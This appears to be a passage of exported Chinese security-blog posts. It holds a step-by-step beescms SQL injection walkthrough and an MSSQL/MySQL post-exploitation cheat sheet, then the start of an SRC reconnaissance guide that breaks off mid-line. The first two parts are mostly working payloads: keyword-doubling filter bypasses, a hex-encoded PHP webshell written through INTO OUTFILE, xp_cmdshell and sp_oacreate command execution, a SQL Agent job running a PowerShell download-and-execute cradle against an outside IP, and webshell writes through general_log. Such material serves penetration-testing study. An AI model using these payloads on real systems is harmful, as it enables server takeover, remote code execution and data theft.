range(num_min,num_max):<br>data[randstr(random.randint(varname_min,varname_max))]=randstr(random.randint(data_min,data_max))<br>print(‘&amp;’+parse.urlencode(data)+’&amp;’)<br>main()</p>\n<h3 id=\"SQL注入实战渗透测试\"><a href=\"#SQL注入实战渗透测试\" class=\"headerlink\" title=\"SQL注入实战渗透测试\"></a>SQL注入实战渗透测试</h3><p>1、首先打开指定站点，这里是以beescms搭建的网站<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317033373-8f7c7d9b-b60a-451a-b28d-ba425f92f9b4.png#align=left&display=inline&height=129&margin=%5Bobject%2Object%5D&name=image.png&originHeight=258&originWidth=554&size=81788&status=done&style=none&width=277\" alt=\"image.png\"> <br>2、通过御剑扫描发现了后台路径/admin/login.php<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317036903-c1a03aaf-c415-48e7-a1c9-6b124a0aa140.png#align=left&display=inline&height=146&margin=%5Bobject%2Object%5D&name=image.png&originHeight=291&originWidth=554&size=59025&status=done&style=none&width=277\" alt=\"image.png\"><br>3、访问后台<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317042060-67c5cd02-56e2-44e5-a90f-05749886fcdc.png#align=left&display=inline&height=142&margin=%5Bobject%2Object%5D&name=image.png&originHeight=283&originWidth=554&size=60786&status=done&style=none&width=277\" alt=\"image.png\"><br>4、抓包并发送到重放数据包模块进行测试<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317045189-57e2568e-0bce-4732-a132-41fb7f0f1967.png#align=left&display=inline&height=118&margin=%5Bobject%2Object%5D&name=image.png&originHeight=237&originWidth=554&size=59839&status=done&style=none&width=277\" alt=\"image.png\"><br>5、在账号处加一个单引号测试，发现页面报错了，这里说明存在SQL注入<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317049040-76788297-cf7a-498a-bf05-a94be7c5846d.png#align=left&display=inline&height=92&margin=%5Bobject%2Object%5D&name=image.png&originHeight=184&originWidth=554&size=53711&status=done&style=none&width=277\" alt=\"image.png\"><br>6、打开源码，找到该登录处，发现对于post传参的user进行了函数fl_value和fl_html处理。处理之后后面就放到check_login函数执行了。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317053351-e7c46278-96ce-446c-9113-49f608e9462e.png#align=left&display=inline&height=144&margin=%5Bobject%2Object%5D&name=image.png&originHeight=288&originWidth=554&size=64458&status=done&style=none&width=277\" alt=\"image.png\"><br>7、定位fl_value函数，发现对于SQL注入进行了处理，将敏感字符过滤为空。<br>过滤的敏感字符有：select | insert | update | and | in | on | left | joins | delete | %| = | / * | * | ../ | ./ | union | from | where | group | into | load_file | outfile<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317057459-1b75bd6c-f68f-471d-803f-4606333306ff.png#align=left&display=inline&height=43&margin=%5Bobject%2Object%5D&name=image.png&originHeight=85&originWidth=554&size=19441&status=done&style=none&width=277\" alt=\"image.png\"><br>8、很明显这里防SQL注入进行的不是很到位，只进行了一次替换为空，那么就可以通过双写关键字进行绕过。定位第二个处理函数fl_html，发现这里是进行了html实体化处理，是防止xss的，htmlspecialchars函数默认情况下只对双引号进行编码，对我们使用单引号进行SQL注入没有影响。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317060800-0510c154-b4ff-4202-9b12-37db39d11e93.png#align=left&display=inline&height=29&margin=%5Bobject%2Object%5D&name=image.png&originHeight=58&originWidth=366&size=11625&status=done&style=none&width=183\" alt=\"image.png\"><br>9、跟进check_login函数，发现将传入的数据直接放到了SQL查询语句进行查询。那么此处通过双写即可绕过进行注入了。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317065197-0ab9f91c-73e7-4991-b518-2a049007d84d.png#align=left&display=inline&height=58&margin=%5Bobject%2Object%5D&name=image.png&originHeight=115&originWidth=554&size=27857&status=done&style=none&width=277\" alt=\"image.png\"><br>10、回到网站，通过order by 判断出当前数据库字段数为5<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317068401-fc66cb55-5dfb-41f7-9f55-726dab9ffd30.png#align=left&display=inline&height=101&margin=%5Bobject%2Object%5D&name=image.png&originHeight=201&originWidth=554&size=50976&status=done&style=none&width=277\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317071848-afb83dbf-a19a-40fb-9c66-af5cabf23c07.png#align=left&display=inline&height=80&margin=%5Bobject%2Object%5D&name=image.png&originHeight=160&originWidth=554&size=45734&status=done&style=none&width=277\" alt=\"image.png\"><br>11、经测试，联合查询终于成功了。绕过方法：<br>un union ion -&gt; union<br>seselectlect -&gt; select<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317076201-0c74fd9e-0530-4941-8e19-68fffcaade81.png#align=left&display=inline&height=111&margin=%5Bobject%2Object%5D&name=image.png&originHeight=221&originWidth=554&size=51714&status=done&style=none&width=277\" alt=\"image.png\"><br>12、这里很明显不能显错注入，尝试使用报错注入获取数据也失败，没有将报错的数据输出出来。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317082978-87ccd5f5-eed6-42b8-bd8c-d313b5d51ff3.png#align=left&display=inline&height=117&margin=%5Bobject%2Object%5D&name=image.png&originHeight=234&originWidth=554&size=62436&status=done&style=none&width=277\" alt=\"image.png\"><br>13、尝试使用sql注入写入webshell，发现页面报错了，通过报错信息可以看到是写入的一句话木马里面带有特殊字符影响了文件的写入。对于敏感字符的绕过方法：<br>in into  -&gt; into<br>ououtfiletfile -&gt; outfile<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317086950-f53a248a-e529-424b-8033-3d275770dfae.png#align=left&display=inline&height=116&margin=%5Bobject%2Object%5D&name=image.png&originHeight=232&originWidth=554&size=65986&status=done&style=none&width=277\" alt=\"image.png\"><br>14、因为符号进行了影响，所以通过16进制来写入webshell，将一句话木马转换为16进制。因为需要数据库识别出这个是16进制的数据，所以要在最前面加上0x。得到16进制的一句话木马：<br>0x3c3f70687020406576616c28245f524551554553545b315d293b3f3e<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317091049-51499331-b0a7-4eb4-9941-6a45055e0e2d.png#align=left&display=inline&height=152&margin=%5Bobject%2Object%5D&name=image.png&originHeight=304&originWidth=554&size=19492&status=done&style=none&width=277\" alt=\"image.png\"><br>15、替换16进制的一句话木马到burp数据包中放包，成功执行了代码，页面返回正常。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317094983-f7fb5184-1a94-4cf1-8295-4c3423910346.png#align=left&display=inline&height=124&margin=%5Bobject%2Object%5D&name=image.png&originHeight=247&originWidth=554&size=62722&status=done&style=none&width=277\" alt=\"image.png\"><br>16、查看服务器文件，成功有了一个8.php文件，内容为一句话木马。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317099323-d646af4a-b862-405d-823c-b2975028e63e.png#align=left&display=inline&height=127&margin=%5Bobject%2Object%5D&name=image.png&originHeight=254&originWidth=554&size=56751&status=done&style=none&width=277\" alt=\"image.png\"><br>17、通过菜刀工具，连接一句话木马，获取网站webshell。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317103226-679c62de-5503-4996-9ea4-acbbad2e0683.png#align=left&display=inline&height=119&margin=%5Bobject%2Object%5D&name=image.png&originHeight=238&originWidth=554&size=18591&status=done&style=none&width=277\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317106445-a24046e6-17ce-443d-b37b-63bd3fc90125.png#align=left&display=inline&height=137&margin=%5Bobject%2Object%5D&name=image.png&originHeight=274&originWidth=554&size=41660&status=done&style=none&width=277\" alt=\"image.png\"><br>18、进行执行系统命令操作。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317113216-93f538c1-d58a-4bac-b262-a15d676aa57a.png#align=left&display=inline&height=137&margin=%5Bobject%2Object%5D&name=image.png&originHeight=273&originWidth=554&size=27211&status=done&style=none&width=277\" alt=\"image.png\"></p>\n<h2 id=\"其他类型的SQL注入\"><a href=\"#其他类型的SQL注入\" class=\"headerlink\" title=\"其他类型的SQL注入\"></a>其他类型的SQL注入</h2><h3 id=\"1、搜索框注入\"><a href=\"#1、搜索框注入\" class=\"headerlink\" title=\"1、搜索框注入\"></a>1、搜索框注入</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=<span class=\"number\">1</span><span class=\"string\">&#x27; and &#x27;</span><span class=\"number\">1</span>%<span class=\"string\">&#x27;=&#x27;</span><span class=\"number\">1</span>\t\t<span class=\"comment\">//返回正确的搜索结果</span></span><br><span class=\"line\">?id=<span class=\"number\">1</span><span class=\"string\">&#x27; and &#x27;</span><span class=\"number\">1</span>%<span class=\"string\">&#x27;=&#x27;</span><span class=\"number\">2</span>\t\t<span class=\"comment\">//没有返回结果</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"2、header头部注入\"><a href=\"#2、header头部注入\" class=\"headerlink\" title=\"2、header头部注入\"></a>2、header头部注入</h3><p>Client-IP<br>User-Agent<br>X-Forwarded-For</p>\n<h2 id=\"SQL注入利用\"><a href=\"#SQL注入利用\" class=\"headerlink\" title=\"SQL注入利用\"></a>SQL注入利用</h2><h3 id=\"1、MSSQL\"><a href=\"#1、MSSQL\" class=\"headerlink\" title=\"1、MSSQL\"></a>1、MSSQL</h3><h4 id=\"0x01-–os-shell\"><a href=\"#0x01-–os-shell\" class=\"headerlink\" title=\"0x01 –os-shell\"></a>0x01 –os-shell</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> /r C: %i in (*<span class=\"number\">020</span>.jpg*) <span class=\"keyword\">do</span> @<span class=\"keyword\">echo</span> %i <span class=\"comment\">//寻找020.jpg，获取所在目录</span></span><br><span class=\"line\"></span><br><span class=\"line\">dir c:\\phpstudy\\WWW\\image\t\t\t\t\t\t\t\t<span class=\"comment\">//列出某目录下文件</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> ^&lt;%@ Page Language=<span class=\"string\">&quot;Jscript&quot;</span>%^&gt;^&lt;%<span class=\"keyword\">eval</span>(Request.Item[<span class=\"string\">&quot;1&quot;</span>],<span class=\"string\">&quot;unsafe&quot;</span>);%^&gt; &gt; c:\\phpstudy\\WWW\\image\\shell.asp</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x02-命令执行\"><a href=\"#0x02-命令执行\" class=\"headerlink\" title=\"0x02 命令执行\"></a>0x02 命令执行</h4><p>1、xp_cmdshell</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#开启xp_cmdshell</span></span><br><span class=\"line\">?id=<span class=\"number\">1</span>;<span class=\"keyword\">use</span> <span class=\"title\">master</span>;exec sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>,<span class=\"number\">1</span>;reconfigure;exec sp_configure <span class=\"string\">&#x27;xp_cmdshell&#x27;</span>,<span class=\"number\">1</span>;reconfigure;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#执行</span></span><br><span class=\"line\">?id=<span class=\"number\">1</span>;<span class=\"keyword\">use</span> <span class=\"title\">master</span>;exec master..xp_cmdshell <span class=\"string\">&quot;whoami&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#恢复被删除的xp_cmdshell(提示xplog79.dll找不到则自己上传)</span></span><br><span class=\"line\">exec sp_addextendedproc xp_cmdshell ,@dllname=<span class=\"string\">&quot;D:\\\\xplog79.dll&quot;</span></span><br></pre></td></tr></table></figure>\n<p>2、sp_oacreate</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#xp_cmdshell删除后可以使用sp_oacreate</span><br><span class=\"line\">#开启sp_oacreate</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>,<span class=\"number\">1</span>;</span><br><span class=\"line\">reconfigure <span class=\"keyword\">with</span> override;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;Ole Automation Procedures&#x27;</span>,<span class=\"number\">1</span>;</span><br><span class=\"line\">reconfigure <span class=\"keyword\">with</span> override;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>,<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">#执行[此方法无回显]</span><br><span class=\"line\"><span class=\"keyword\">declare</span> <span class=\"variable\">@shell</span> <span class=\"type\">int</span> <span class=\"keyword\">exec</span> sp_oacreate <span class=\"string\">&#x27;wscript.shell&#x27;</span>,<span class=\"variable\">@shell</span> output <span class=\"keyword\">exec</span> sp_oamethod <span class=\"variable\">@shell</span>,<span class=\"string\">&#x27;run&#x27;</span>,<span class=\"keyword\">null</span>,<span class=\"string\">&#x27;c:\\windows\\system32\\cmd.exe /c whoami &gt;d:\\\\temp\\\\1.txt&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>3、通过沙盒执行命令<br>4、注册表<br>5、通过Agent Job执行命令</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#执行cs powershell命令</span><br><span class=\"line\">USE msdb; <span class=\"keyword\">EXEC</span> dbo.sp_add_job <span class=\"variable\">@job</span>_name <span class=\"operator\">=</span> N<span class=\"string\">&#x27;test_powershell_job1&#x27;</span> ; <span class=\"keyword\">EXEC</span> sp_add_jobstep <span class=\"variable\">@job</span>_name <span class=\"operator\">=</span> N<span class=\"string\">&#x27;test_powershell_job1&#x27;</span>, <span class=\"variable\">@step</span>_name <span class=\"operator\">=</span> N<span class=\"string\">&#x27;test_powershell_name1&#x27;</span>, <span class=\"variable\">@subsystem</span> <span class=\"operator\">=</span> N<span class=\"string\">&#x27;PowerShell&#x27;</span>, <span class=\"variable\">@command</span> <span class=\"operator\">=</span> N<span class=\"string\">&#x27;powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;&#x27;http://192.168.214.129:80/a&#x27;&#x27;))&quot;&#x27;</span>, <span class=\"variable\">@retry</span>_attempts <span class=\"operator\">=</span> <span class=\"number\">1</span>, <span class=\"variable\">@retry</span>_interval <span class=\"operator\">=</span> <span class=\"number\">5</span> ;<span class=\"keyword\">EXEC</span> dbo.sp_add_jobserver <span class=\"variable\">@job</span>_name <span class=\"operator\">=</span> N<span class=\"string\">&#x27;test_powershell_job1&#x27;</span>; <span class=\"keyword\">EXEC</span> dbo.sp_start_job N<span class=\"string\">&#x27;test_powershell_job1&#x27;</span>;</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x03-文件操作\"><a href=\"#0x03-文件操作\" class=\"headerlink\" title=\"0x03 文件操作\"></a>0x03 文件操作</h4><p>1、判断文件是否存在</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#返回<span class=\"number\">0</span>表示不存在，返回<span class=\"number\">1</span>表示存在</span><br><span class=\"line\"><span class=\"keyword\">exec</span> xp_fileexist &quot;c:\\\\users\\\\public\\\\test.txt&quot;</span><br></pre></td></tr></table></figure>\n<p>2、列目录</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#第一个参数表示要查看的文件夹，第二个参数表示递归层数，第三个参数表示展示的内容包括文件。</span><br><span class=\"line\"><span class=\"keyword\">exec</span> xp_subdirs &quot;C:\\Users\\Administrator\\&quot;,<span class=\"number\">2</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>3、写文件</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#开启Web Assistant Procedures</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;Web Assistant Procedures&#x27;</span>,<span class=\"number\">1</span>;RECONFIGURE;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_makewebtask <span class=\"string\">&#x27;c:\\www\\testwr.asp&#x27;</span>,<span class=\"string\">&#x27;select&#x27;&#x27;&lt;%execute(request(&#x27;</span>ss<span class=\"string\">&#x27;))%&gt;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>4、创建目录</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> xp_create_subdir <span class=\"string\">&#x27;D:\\test&#x27;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"0x04-信息获取\"><a href=\"#0x04-信息获取\" class=\"headerlink\" title=\"0x04 信息获取\"></a>0x04 信息获取</h4><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> xp_getnetname\t\t\t<span class=\"operator\">/</span><span class=\"operator\">/</span>计算机名</span><br><span class=\"line\"><span class=\"keyword\">exec</span> xp_msver\t\t\t\t\t\t<span class=\"operator\">/</span><span class=\"operator\">/</span>系统信息</span><br><span class=\"line\"><span class=\"keyword\">exec</span> xp_fixeddrives\t\t\t<span class=\"operator\">/</span><span class=\"operator\">/</span>驱动器信息</span><br><span class=\"line\"><span class=\"keyword\">select</span> default_domain() <span class=\"keyword\">as</span> mydomain;\t\t<span class=\"operator\">/</span><span class=\"operator\">/</span>获取域名</span><br></pre></td></tr></table></figure>\n<h3 id=\"2、MYSQL\"><a href=\"#2、MYSQL\" class=\"headerlink\" title=\"2、MYSQL\"></a>2、MYSQL</h3><p>在高版本的mysql中，一般默认配置了–secure_file_priv为null限制了文件写入，这种情况就需要通过general_log_file/show_query_log_file来尝试写文件。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#general_log_file</span><br><span class=\"line\"><span class=\"keyword\">set</span> <span class=\"keyword\">global</span> general_log<span class=\"operator\">=</span><span class=\"string\">&#x27;on&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">set</span> <span class=\"keyword\">global</span> general_log_file<span class=\"operator\">=</span><span class=\"string\">&#x27;D:/phpStudy/WWW/1.php&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"string\">&#x27;&lt;?php assert($_POST[1]);?&gt;&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">set</span> <span class=\"keyword\">global</span> general_log<span class=\"operator\">=</span><span class=\"string\">&#x27;off&#x27;</span>; <span class=\"operator\">/</span><span class=\"operator\">/</span>切记关闭</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#show_query_log_file</span><br><span class=\"line\"><span class=\"keyword\">set</span> <span class=\"keyword\">global</span> show_query_log<span class=\"operator\">=</span><span class=\"string\">&#x27;on&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">set</span> <span class=\"keyword\">global</span> show_query_log_file<span class=\"operator\">=</span><span class=\"string\">&#x27;D:\\\\phpStudy\\\\WWW\\\\1.php&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">select</span> sleep(<span class=\"number\">15</span>),<span class=\"string\">&#x27;&lt;?php assert($_POST[1]);?&gt;&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">set</span> <span class=\"keyword\">global</span> show_query_log<span class=\"operator\">=</span><span class=\"string\">&#x27;off&#x27;</span>; <span class=\"operator\">/</span><span class=\"operator\">/</span>切记关闭</span><br></pre></td></tr></table></figure>\n\n"},{"title":"src漏洞挖掘之有效信息收集","keywords":"SRC,信息收集,漏洞挖掘","description":"src漏洞挖掘之有效信息收集","cover":"/images/src_wajue.png","date":"2021-10-25T02:45:41.000Z","_content":"\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n> 本文已发布到先知社区\n>\n> 作者：ajie\n\n    \n    说到信息收集，网上已经有许多文章进行描述了，那么从正常的子域名、端口、旁站、C段等进行信息收集的话，对于正常项目已经够用了，但是挖掘SRC的话，在诸多竞争对手的“帮助”下，大家收集到的信息都差不多，挖掘的漏洞也往往存在重复的情况。\n      那么现在我就想分享一下平时自己进行SRC挖掘过程中，主要是如何进行入手的。以下均为小弟拙见，大佬勿喷。\n## 0x01 确定目标\n个人是非常讨厌无目标随便打的，有没有自己对应的SRC应急响应平台不说，还往往会因为一开始没有挖掘到漏洞而随意放弃，这样往往不能挖掘到深层次的漏洞。挖到的大多数是大家都可以简单挖到的漏洞，存在大概率重复可能。所以在真的想要花点时间在SRC漏洞挖掘上的话，建议先选好目标。\n\t那么目标怎么选呢，考虑到收益回报与付出的比例来看，建议是从专属SRC入手，特别在一些活动中，可以获取比平时更高的收益。\n微信搜一搜：\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634919905280-6a3474d5-e288-40e0-be14-a11ca5a37bcb.png#clientId=u713ba10f-a757-4&from=paste&height=660&id=u8b4a879d&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1320&originWidth=1360&originalType=binary&ratio=1&size=333456&status=done&style=none&taskId=u74e51aee-8625-4c5e-b368-f880fa9654b&width=680)\n百度搜一搜：\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634919958148-21279f08-65f5-45e2-93cc-37781713440c.png#clientId=u713ba10f-a757-4&from=paste&height=668&id=ubea7849e&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1336&originWidth=1784&originalType=binary&ratio=1&size=467822&status=done&style=none&taskId=u40ba20aa-3b6f-465a-b6ff-105b03a1cac&width=892)\n现在有活动的src已经浮现水面了，那么我们就可与从中选择自己感兴趣的SRC。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634963068419-ddbf4fb7-605b-46a5-aa91-139da2bd03c9.png#clientId=u713ba10f-a757-4&from=paste&height=706&id=u4d43608b&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1412&originWidth=1726&originalType=binary&ratio=1&size=575771&status=done&style=none&taskId=u7150b32d-8964-4f4b-8100-3de307b4870&width=863)\n\n## 0x02 确认测试范围\n前面说到确定测什么SRC，那么下面就要通过一些方法，获取这个SRC的测试范围，以免测偏。\n### 1、公众号\n从公众号推文入手，活动页面中可以发现测试范围\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634963158654-f2016b05-9be3-4cd7-9bda-ea55a87defb1.png#clientId=u713ba10f-a757-4&from=paste&height=630&id=u077f22ee&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1260&originWidth=1452&originalType=binary&ratio=1&size=190701&status=done&style=none&taskId=u56153bbe-9613-4ac9-96e0-549a84f1c4b&width=726)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634963557707-c9d9fa67-1108-49c4-b38a-a74b34a3907f.png#clientId=u713ba10f-a757-4&from=paste&height=630&id=u1c25375f&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1260&originWidth=1452&originalType=binary&ratio=1&size=285450&status=done&style=none&taskId=ue71919ac-0609-45cc-bc63-c3b9f4d2e1c&width=726)\n### 2、应急响应官网\n在应急响应官网，往往会有一些活动的公告，在里面可以获取到相应的测试范围。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634963624546-d5d91332-8080-4b77-9972-77fc8abb52bb.png#clientId=u713ba10f-a757-4&from=paste&height=627&id=u128b3210&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1254&originWidth=2206&originalType=binary&ratio=1&size=321049&status=done&style=none&taskId=u0aa25af0-c011-434c-92f5-f7e3a65d236&width=1103)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634963709884-04818b7a-2686-4c31-b96b-270fd21af35b.png#clientId=u713ba10f-a757-4&from=paste&height=656&id=u3228ec56&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1312&originWidth=2382&originalType=binary&ratio=1&size=592096&status=done&style=none&taskId=u83999522-9aaa-4b01-b710-a57b9ff4f7f&width=1191)\n### 3、爱企查\n从爱企查等商业查询平台获取公司所属域名\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634964085716-15745fa8-785a-4209-b610-668ece5133a0.png#clientId=u713ba10f-a757-4&from=paste&height=484&id=u412ef52f&margin=%5Bobject%2Object%5D&name=image.png&originHeight=968&originWidth=2188&originalType=binary&ratio=1&size=786218&status=done&style=none&taskId=u55826600-0854-44f8-accb-54e3f12c347&width=1094)\n搜索想要测试等SRC所属公司名称，在知识产权->网站备案中可以获取测试范围。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634964167749-6d7913b9-a4be-41ce-a417-88f49ebd7673.png#clientId=u713ba10f-a757-4&from=paste&height=567&id=u96bf1fb3&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1134&originWidth=1884&originalType=binary&ratio=1&size=298889&status=done&style=none&taskId=ua446ee4f-aa26-41c6-8e34-ba5e91db54e&width=942)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634964215181-046d3df9-0dbb-44f2-ba89-59ecdee77f71.png#clientId=u713ba10f-a757-4&from=paste&height=665&id=uf3208897&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1330&originWidth=1836&originalType=binary&ratio=1&size=280408&status=done&style=none&taskId=u8bb717b4-4748-4fbd-b919-6102ba1883b&width=918)\n## 0x03 子域名(oneforall)\n拿到域名之后，下一步我考虑使用oneforall扫描获取子域名，就像网上信息收集的文章一样，主域名的站点不是静态界面就是安全防护等级极强，不是随便就能够发现漏洞的，我们挖掘SRC也是要从子域名开始，从边缘资产或一般资产中发现漏洞。\n工具下载：\n```\nhttps://github.com/shmilylty/OneForAll\n```\n具体用法如下：\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634967168625-da7d57b5-19e1-4f9c-91a2-cd55e8072344.png#clientId=u713ba10f-a757-4&from=paste&height=442&id=u73c9b970&margin=%5Bobject%2Object%5D&name=image.png&originHeight=884&originWidth=1460&originalType=binary&ratio=1&size=385397&status=done&style=none&taskId=ub7b3972f-c412-4a4e-a3c0-224717feaa2&width=730)\t\n常用的获取子域名有2种选择，一种使用--target指定单个域名，一种使用--targets指定域名文件。\n```\npython3 oneforall.py --target example.com run\npython3 oneforall.py --targets ./domains.txt run\n```\n其他获取子域名的工具还有layer子域名挖掘机、Sublist3r、证书透明度、在线工具等，这里就不一一阐述了，大体思路是一样等，获取子域，然后从中筛选边缘资产，安全防护低资产。\n## 0x04 系统指纹探测\n通过上面的方法，我们可以在/OneForAll-0.4.3/results/路径下获取以域名为名字的csv文件。里面放入到便是扫描到到所有子域名以及相应信息了。\n下一步便是将收集到到域名全部进行一遍指纹探测，从中找出一些明显使用CMS、OA系统、shiro、Fastjson等的站点。下面介绍平时使用的2款工具：\n### 1、Ehole\n下载地址：\n```\nhttps://github.com/EdgeSecurityTeam/EHole\n```\n使用方法：\n```\n./Ehole-darwin -l url.txt   //URL地址需带上协议,每行一个\n./Ehole-darwin -f 192.168.1.1/24  //支持单IP或IP段,fofa识别需要配置fofa密钥和邮箱\n./Ehole-darwin -l url.txt -json export.json  //结果输出至export.json文件\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1634968178111-36292547-bea8-487c-a8cf-722c63427df3.png#clientId=u713ba10f-a757-4&from=paste&height=415&id=u3671b8ae&margin=%5Bobject%2Object%5D&name=image.png&originHeight=830&originWidth=1460&originalType=binary&ratio=1&size=320488&status=done&style=none&taskId=u181ebb87-7fc2-4806-81f9-6a3c42cf463&width=730)\n### 2、Glass\n下载地址：\n```\nhttps://github.com/s7ckTeam/Glass\n```\n使用方法：\n```\npython3 Glass.py -u http://www.examples.com  // 单url测试\npython3 Glass.py -w domain.txt -o 1.txt  // 